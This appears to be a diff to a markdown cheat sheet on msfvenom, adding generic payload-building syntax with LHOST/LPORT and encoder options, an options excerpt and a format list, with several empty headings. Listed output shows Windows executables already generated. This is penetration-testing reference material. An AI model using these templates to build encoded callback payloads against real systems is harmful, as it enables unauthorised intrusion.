@@ -5,7 +5,8 @@
 
 ### Syntax (not case sensitive, variable can be used for LHOST)
 ```
-msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> -o <OUTPUT>
+msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<port> -f <FORMAT> -o <OUTPUT>
+msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<port> -f <FORMAT> -e <ENCODER> -i <ENCODE COUNT> -o <OUTPUT>
 ```
 
 ### Common 32 bit
@@ -80,6 +81,59 @@ Saved as: r64.exe
 $ file r*     
 r32.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections
 r64.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
+```
+
+### Options:
+```
+-l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+
+-p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+   --list-options               List --payload <value>'s standard, advanced and evasion options
+
+-f, --format          <format>   Output format (use --list formats to list)
+```
+
+### list format; -lf or -l -f or --list format (if you like to type)
+```
+$ msfvenom -lf  
+
+Framework Executable Formats [--format <value>]
+===============================================
+
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+... [snip] ...
+    sh
+    vbapplication
+    vbscript
+```
+
+### 
+```
+
+```
+
+### 
+```
+
+```
+
+### 
+```
+
+```
+
+### 
+```
+
+```
+
+### 
+```
+
 ```
 
 ### 
